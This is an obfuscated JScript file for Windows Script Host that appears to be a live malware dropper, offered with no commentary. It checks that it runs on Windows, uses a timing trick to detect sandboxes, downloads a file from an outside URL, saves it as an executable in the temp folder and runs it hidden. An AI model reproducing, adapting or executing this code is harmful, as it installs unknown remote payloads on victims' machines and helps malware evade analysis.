var _LZ = false;
var _G = "CreateObject";
var _RE = function _HO() {return WScript[_G]("WScript"+".Shell");}(), _WF = 11;
var _Y = "MSXML2.XMLHTTP";
var _ME = 2123213;
var _R = 0;
function _O(_ML){_RE["Run"](_ML, _R, _R);};
function _YB(){return _Y + "";};
function _F(_J0, _F0){_R = _R * 1; return _J0 - _F0;};
function _B(){return _G;};
/*@cc_on
  @if (@_win32 || @_win64)
    _LZ = true;
  @end
@*/
if (_LZ)
{
var _CL = "";
function _DF(){return 22;};
var _YS = 0; var _FO = 0;
function _YK()
{
var _QJ = new this["Date"]();
var _IL = _QJ["getUTCMilliseconds"]();
WScript["Sleep"](_DF());
var _QJ = new this["Date"]();
var _E = _QJ["getUTCMilliseconds"]();
WScript["Sleep"](_DF());
var _QJ = new this["Date"]();
var _V = _QJ["getUTCMilliseconds"]();
var _YS = "_T";
_YS = _F(_E, _IL);
var _FO = "_RC";
_FO = _F(_V, _E);
_CL = "open";
return _F(_YS, _FO);
}
var _TA = false;
var _GE = false;
for (var _EA = _R; _EA < _DF() * 1; _EA++){if (_YK() != _R){
_TA = true; 
_FO = "31" + 11 * _YS + _FO; 
_GE = true; 
break;
}}
function _AG() {return ((_TA == true) && (_TA == _GE)) ? 1 : _R;};
if (_TA && _AG() && _GE){
function _BG() {return _RE["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "H2x6VKsq.ex" + "e";};
 _XC = _YB();
 _V0 = WScript[_G](_XC);
 var _JZ = 1;
 while (_JZ){
try {
	if (_JZ == 1)
	{
		_V0[_CL]("GET", "http://ihlasauracleanmax.co/j3dlad", false);
		_V0["send"]();
		_QW = "Sleep";
	}
	WScript[_QW](_DF() + 120); 
	if (_V0["readystate"] < 2 * 2) continue;
	_JZ = _R;
	function _SZ(_A) {var _J = (1, 2, 3, 4, 5, _A); return _J;};
	_O0 = WScript[_B()]("ADODB.Stream");
	_XC = _O0;
	_XC[_CL]();
	_XC["type"] = _SZ(1);
	_XC["write"](_V0["ResponseBody"]);
	_O0["position"] = _SZ(_R);
	_XC["Save" + "ToFile"](_BG(), 2);
	_O0["cl"+"ose"]();
	_MD = _BG();
	_O(_MD);
} catch(_XH){};
}
}
}

